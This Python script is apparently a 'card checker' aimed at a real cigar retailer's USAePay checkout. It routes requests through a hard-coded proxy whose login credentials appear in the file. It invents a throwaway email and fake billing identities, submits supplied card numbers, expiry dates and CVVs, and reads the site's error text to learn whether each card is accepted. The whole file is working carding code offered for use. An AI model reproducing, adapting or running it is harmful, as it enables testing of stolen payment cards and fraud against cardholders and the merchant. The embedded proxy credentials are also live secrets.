import requests,random,string,asyncio

def getstr(text, start_delim, end_delim):
    start = text.find(start_delim)
    if start == -1:
        return None
    start += len(start_delim)
    end = text.find(end_delim, start)
    if end == -1:
        return None
    return text[start:end]

def proxies():
    proxies = [
        'us9.cactussstp.com:3129:akoitwja:x9b2wc76QW',
    ]
    format_proxy = lambda x: f"http://{x.split(':')[2]}:{x.split(':')[3]}@{x.split(':')[0]}:{x.split(':')[1]}"
    return {'http': format_proxy(random.choice(proxies)), 'https': format_proxy(random.choice(proxies))}

def generate_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'])
    return f'{username}@{domain}'

async def usaepay1(cc, mm, yy, cvv):
    proxy = proxies()
    email = generate_email()
    r = requests.Session()
    r.proxies = proxy
    if cc.startswith('4'):
        card_type = 'Visa'
    elif cc.startswith('5'):
        card_type = 'Mastercard'
    elif cc.startswith('37'):
        card_type = 'American_Express'
    else:
        return 'Card type not supported'
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.hiramandsolomoncigars.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/merchandise/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        '2-cigars-case-holder': '1',
        '2-cigars-holder-only-in-black': '0',
        '3-cigars-holder-only-in-cognac': '0',
        'leather-and-wood-5-cigars-holder-only-in-black': '0',
        'all-leather-5-cigar-holder-black': '0',
        'all-leather-5-cigar-holder-cognac': '0',
        'all-leather-5-cigar-holder-blue-cognac': '0',
        'all-leather-5-cigar-holder-black-cognac': '0',
        'all-leather-5-cigar-holder-grey-navy-blue': '0',
        'all-leather-5-cigar-holder-purple-red': '0'
    }

    response = r.post('https://www.hiramandsolomoncigars.com/catalog/public/checkout/', headers=headers, data=data)
    await asyncio.sleep(1)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/merchandise/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = (
        ('public', ''),
    )
    response = r.get('https://www.hiramandsolomoncigars.com/cart/', headers=headers, params=params)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/cart/?public',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = r.get('https://www.hiramandsolomoncigars.com/checkout/public', headers=headers)
    await asyncio.sleep(1)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.hiramandsolomoncigars.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/checkout/public',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'first_name': 'Bria',
        'last_name': 'Von',
        'phone': '8487878549',
        'email': email,
        'ship_name': 'Ayan XD',
        'ship_address': 'New York',
        'ship_city': 'New York',
        'ship_state': 'NY',
        'ship_zip': '10080',
        'ship_country': 'USA',
        'bill_name': 'Ayan XD',
        'bill_address': 'New York',
        'bill_city': 'New York',
        'bill_state': 'NY',
        'bill_zip': '10080',
        'bill_country': 'USA',
        'cc_name': 'Ayan Xd',
        'cc_number': cc,
        'cc_type': card_type,
        'cc_val': cvv,
        'cc_month': mm,
        'cc_year': yy,
    }
    await asyncio.sleep(2)
    response = r.post('https://www.hiramandsolomoncigars.com/checkout/public', headers=headers, data=data)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/checkout/public',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    response = r.get('https://www.hiramandsolomoncigars.com/checkout/public/confirm/', headers=headers,)

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.hiramandsolomoncigars.com',
        'Pragma': 'no-cache',
        'Referer': 'https://www.hiramandsolomoncigars.com/checkout/public/confirm/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'Submit': 'Submit Order'
    }
    await asyncio.sleep(1)
    response = r.post('https://www.hiramandsolomoncigars.com/checkout/public/confirm/', headers=headers, data=data)
    try:
        error_msg = getstr(response.text, '<h5 style="color:#e00000">', ', </h5>')
        if error_msg:
            return error_msg
        else:
            return 'Order placed successfully!'
    except:
        return 'An error occurred while placing the order.'